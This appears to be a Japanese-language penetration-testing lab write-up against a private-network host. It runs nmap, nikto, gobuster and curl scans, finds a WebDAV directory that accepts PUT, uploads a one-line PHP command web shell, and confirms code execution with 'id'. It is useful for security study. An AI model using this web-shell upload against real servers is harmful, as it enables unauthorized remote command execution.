nmap -Pn -sV -sC  -p80 192.168.0.111

![[Webの調査 image 75.png]]

nmap -Pn -sV -sC -O -p80 192.168.0.111

![[Webの調査 image 76.png]]

nmap --script vuln -p80 192.168.0.111

![[Webの調査 image 77.png]]

/test/というディレクトリ

nikto -h 192.168.0.111

![[Webの調査 image 78.png]]

/test/

/#wp-config.php#/

gobuster dir -u http://192.168.0.111:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

![[Webの調査 image 79.png]]

ブラウザアクセス

![[Webの調査 image 80.png]]

ソース、robots.txtはなにもなし

http://192.168.0.111/test/

![[Webの調査 image 81.png]]

/test/ディレクトリのHTTPヘッダ情報の調査

curl --head -X OPTIONS http://192.168.0.111/test/

![[Webの調査 image 82.png]]

DAV: 1,2

MS-Author-Via: DAV

Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK

Allow: OPTIONS, GET, HEAD, POST

/test/ディレクトリにPUT method をつかってコマンド操作用のphpファイルをアップロードする

curl -v -X PUT -d '\<?php system($_GET\["cmd"\]);?>' http://192.168.0.111/test/shell.php

![[Webの調査 image 83.png]]

蔵置の確認

![[Webの調査 image 84.png]]

テスト

http://192.168.0.111/test/shell.php?cmd=id

![[Webの調査 image 85.png]]

成功